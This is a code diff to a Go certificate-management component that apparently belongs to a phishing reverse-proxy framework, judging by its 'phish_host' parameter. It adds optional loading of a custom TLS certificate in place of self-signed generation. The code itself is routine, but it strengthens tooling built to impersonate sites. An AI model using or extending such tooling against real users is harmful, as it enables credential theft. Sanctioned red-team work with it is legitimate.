@@ -21,22 +21,24 @@ import (
 )
 
 type CertDb struct {
-	cache_dir string
-	magic     *certmagic.Config
-	cfg       *Config
-	ns        *Nameserver
-	caCert    tls.Certificate
-	tlsCache  map[string]*tls.Certificate
+	cache_dir  string
+	magic      *certmagic.Config
+	cfg        *Config
+	ns         *Nameserver
+	caCert     tls.Certificate
+	tlsCache   map[string]*tls.Certificate
+	customCert *tls.Certificate
 }
 
-func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
+func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver, certPath string, keyPath string) (*CertDb, error) {
 	os.Setenv("XDG_DATA_HOME", cache_dir)
 
 	o := &CertDb{
-		cache_dir: cache_dir,
-		cfg:       cfg,
-		ns:        ns,
-		tlsCache:  make(map[string]*tls.Certificate),
+		cache_dir:  cache_dir,
+		cfg:        cfg,
+		ns:         ns,
+		tlsCache:   make(map[string]*tls.Certificate),
+		customCert: nil,
 	}
 
 	if err := os.MkdirAll(filepath.Join(cache_dir, "sites"), 0700); err != nil {
@@ -45,6 +47,16 @@ func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
 
 	certmagic.DefaultACME.Agreed = true
 	certmagic.DefaultACME.Email = o.GetEmail()
+
+	// Load custom certificate if provided
+	if certPath != "" && keyPath != "" {
+		cert, err := tls.LoadX509KeyPair(certPath, keyPath)
+		if err != nil {
+			return nil, fmt.Errorf("failed to load custom certificate: %v", err)
+		}
+		o.customCert = &cert
+		log.Info("loaded custom certificate from: %s", certPath)
+	}
 
 	err := o.generateCertificates()
 	if err != nil {
@@ -269,7 +281,16 @@ func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, er
 	return state.PeerCertificates[0], nil
 }
 
+func (o *CertDb) GetCustomCertificate() *tls.Certificate {
+	return o.customCert
+}
+
 func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
+	// Return custom certificate if available
+	if o.customCert != nil {
+		return o.customCert, nil
+	}
+
 	var x509ca *x509.Certificate
 	var template x509.Certificate
 
